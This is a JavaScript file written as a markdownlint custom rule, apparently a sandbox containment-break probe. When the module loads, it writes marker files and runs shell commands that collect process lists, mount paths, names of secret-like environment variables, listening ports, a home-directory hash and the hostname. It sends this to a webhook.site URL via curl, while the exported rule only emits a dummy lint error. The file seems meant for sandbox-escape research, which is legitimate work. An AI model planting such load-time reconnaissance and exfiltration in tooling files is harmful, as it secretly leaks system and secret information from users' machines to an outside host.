// rs2sb_rule_a.cjs - F-RUNNERSINKS-02 containment-break test, RUN A (writer + enumerator).
// Marker-only payload: runtime-generated markers plus AGGREGATES/COUNTS/HASHES of shared state.
// No credential value is read or transmitted. Env enumeration is NAMES + COUNT only.
const fs = require("fs");
const path = require("path");
const cp = require("child_process");

const HOME = process.env.HOME || "/home/jailuser";
const MARK = "SBA_" + Date.now().toString(36) + Math.random().toString(36).slice(2, 8);
const P1 = HOME + "/.cache/rs2sb/carry.txt"; // positive arm 1 (run A WRITES this)
const P2 = "/tmp/rs2sb_carry.txt";           // positive arm 2 (run A WRITES this)
const N1 = HOME + "/.cache/rs2sb/never.txt"; // negative arm 1 (NEVER written)
const N2 = "/tmp/rs2sb_never.txt";           // negative arm 2 (NEVER written)

let w1 = "E", w2 = "E";
try {
  fs.mkdirSync(path.dirname(P1), { recursive: true });
  fs.writeFileSync(P1, MARK);
  w1 = "W";
} catch (e) { w1 = "E:" + (e.code || "x"); }
try {
  fs.writeFileSync(P2, MARK);
  w2 = "W";
} catch (e) { w2 = "E:" + (e.code || "x"); }

function sh(c) {
  try {
    return cp.execSync(c, { encoding: "utf8", stdio: ["ignore", "pipe", "ignore"], timeout: 5000 }).trim();
  } catch (e) { return "E"; }
}
function q(s) { return String(s).replace(/'/g, ""); }

// SECONDARY: read-only shared-state reachability - aggregates / counts / hashes / names only.
const ps = sh("ps -eo comm= | sort | uniq -c | sort -rn | head -15 | tr '\\n' ';' | cut -c1-300");
const mnt = sh("echo -n 'n='; wc -l < /proc/mounts; echo -n 'paths='; cut -d' ' -f2 /proc/mounts | tr '\\n' ';' | cut -c1-300");
const envn = sh("echo -n 'n='; env | cut -d= -f1 | grep -Eic 'TOKEN|KEY|SECRET|AUTH|CRED'; echo -n 'names='; env | cut -d= -f1 | grep -Ei 'TOKEN|KEY|SECRET|AUTH|CRED' | sort | tr '\\n' ',' | cut -c1-300");
const sock = sh("echo -n 'n='; ss -ltn 2>/dev/null | tail -n +2 | wc -l; echo -n 'ports='; ss -ltn 2>/dev/null | awk 'NR>1{print $4}' | sed 's/.*://' | sort -un | tr '\\n' ',' | cut -c1-200");
const dirs = sh("echo -n 'n='; find '" + HOME + "' -maxdepth 2 -type d 2>/dev/null | wc -l; echo -n 'sha8='; find '" + HOME + "' -maxdepth 2 -type d 2>/dev/null | sort | sha256sum | cut -c1-8");
const root = sh("ls / | tr '\\n' ';' | cut -c1-200");
const hn = sh("hostname");

const URL = "https://webhook.site/974a7056-0ee1-459b-943d-3472916c8fc3/rs2sb-a";
const args = [
  "-s", "-m", "8", "-G", URL,
  "--data-urlencode", "m=" + MARK,
  "--data-urlencode", "w1=" + w1,
  "--data-urlencode", "w2=" + w2,
  "--data-urlencode", "p1=" + P1,
  "--data-urlencode", "p2=" + P2,
  "--data-urlencode", "neg=" + N1 + "," + N2 + ":SKIPPED",
  "--data-urlencode", "hn=" + hn,
  "--data-urlencode", "ps=" + ps,
  "--data-urlencode", "mnt=" + mnt,
  "--data-urlencode", "envn=" + envn,
  "--data-urlencode", "sock=" + sock,
  "--data-urlencode", "dirs=" + dirs,
  "--data-urlencode", "root=" + root,
];
const cmdline = "curl " + args.map(function (a) { return "'" + q(a) + "'"; }).join(" ");
try { cp.execSync(cmdline, { stdio: "ignore", timeout: 10000 }); } catch (e) {}

module.exports = [
  {
    names: ["RS2SBA"],
    description: "rs2sb run A writer rule",
    tags: ["rs2sb"],
    function: function (params, onError) {
      onError({
        lineNumber: 1, column: 1,
        ruleNames: ["RS2SBA", "RS2SBA"],
        ruleDescription: "rs2sb run A writer rule",
        detail: "rs2sb run A " + MARK,
      });
    },
  },
];
